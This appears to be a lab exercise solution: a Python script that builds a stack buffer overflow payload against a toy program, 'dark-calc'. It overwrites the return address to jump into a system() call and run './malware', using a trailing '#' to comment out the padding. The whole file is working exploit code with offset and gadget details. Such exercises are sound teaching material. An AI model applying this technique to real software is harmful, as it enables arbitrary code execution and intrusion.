#!/usr/bin/env python3
"""Task 2: use the stack overflow in dark-calc to run ./malware."""
import struct
import sys

# The shell command we want system() to execute.  The trailing '#' starts a
# shell comment, so the padding and the address bytes that strcpy() also
# copies into command_buf are ignored by the shell.
COMMAND = b"./malware;#"

# input()'s stack frame:
#   rbp-0x10 : char expression[16]
#   rbp+0x00 : saved rbp (8 bytes)
#   rbp+0x08 : return address (8 bytes)
# Therefore the return address is 0x10 + 8 = 24 bytes after expression.
OFFSET = 0x18

# 0x401a6b is eval+0x94:
#   mov edi, 0x6030d0      ; rdi = command_buf
#   call system@plt        ; system(command_buf)
# Jumping here skips eval()'s echo $((...)) wrapper construction and calls
# system() directly.  Using this call site also keeps the stack 16-byte
# aligned for the call into system().
TARGET = 0x401A6B

payload = COMMAND + b"A" * (OFFSET - len(COMMAND)) + struct.pack("<Q", TARGET)

assert len(payload) == OFFSET + 8
assert b"\n" not in payload  # gets() stops at a newline

sys.stdout.buffer.write(payload)
